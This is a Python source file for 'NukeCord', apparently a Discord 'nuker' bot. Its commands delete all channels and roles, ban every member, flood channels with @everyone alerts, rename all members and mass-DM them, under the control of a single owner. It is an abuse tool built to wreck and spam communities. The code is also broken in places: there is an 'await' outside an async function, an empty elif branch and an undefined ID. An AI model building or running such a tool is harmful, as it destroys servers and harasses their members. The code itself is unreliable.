import discord 
from discord.ext import commands
import json, os
from colorama import Fore as color
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="nc!", intents=intents)
bot.remove_command("help")
print(color.YELLOW + """
  _  _      _        ___            _ 
 | \| |_  _| |_____ / __|___ _ _ __| |
 | .` | || | / / -_) (__/ _ \ '_/ _` |
 |_|\_|\_,_|_\_\___|\___\___/_| \__,_|
                                      
""".center(24))
f = open("config.json", "r")
x = f.read()
y = json.loads(x)
TOKEN = y["token"]
f.close()


print(color.RESET + "[1] Delete channels | [2] Create channels | [3] Alert message\n[4] Ban everyone | [5] Delete roles | [6] Create roles\n[7] Flood chat | [8] Change nicknames | [9] Mass DM".center(24))

choice = input("Choice: ")
if choice == "1":
  id = input("Guild ID: ")
  for guild in bot.guilds:
    if guild.id == int(id):
      for channel in guild.channels:
        try:
          n = channel.name
          await channel.delete()
          print(color.GREEN + f"[~] Deleted {n}")
        except:
          print(color.RED + f"[!] Error deleting {channel.name}")
elif choice == "2":




@bot.command()
@commands.guild_only()
async def alert(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            if type(channel) != discord.channel.TextChannel:
                print("\n")
            else:
                await channel.send(f"{arg} | @everyone")
                
                
@bot.command()
@commands.guild_only()
async def flood(ctx, *, arg):
    if ctx.author.id == ID:
        i = 100
        while i >= 0:
            await ctx.send(arg)
            i = int(i) - 1
        print(color.GREEN + f"[~] Flooded {ctx.channel.name}")

            
@bot.command()
@commands.guild_only()
async def ban(ctx):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                if member == ctx.author:
                    print(color.YELLOW + f"[~] Skipped banning {ctx.author}")
                else:
                    await member.ban(reason=None)
            except:
                print(color.RED + f"[!] Failed banning {member}")
        await msg.add_reaction("✅")
    else:
        return
    
    
@bot.command()
@commands.guild_only()
async def nicknames(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                await member.edit(nick=arg)
            except:
                print(color.RED + f"[!] Failed to change nickname of {member}")
        await msg.add_reaction("✅")
    else:
        return    
            

@bot.command()
@commands.guild_only()
async def roles(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                print(color.RED + f"[!] Failed to delete {role.name}")
        x = 30
        guild = ctx.guild
        while x >= 0:
            await guild.create_role(name=arg)
            x = int(x) - 1
        await msg.add_reaction("✅")
        
@bot.command()
@commands.guild_only()
async def dm(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                await member.send(arg)
            except:
                print(color.RED + f"[!] Failed to DM {member}")
        await msg.add_reaction("✅")
        

bot.run(TOKEN)
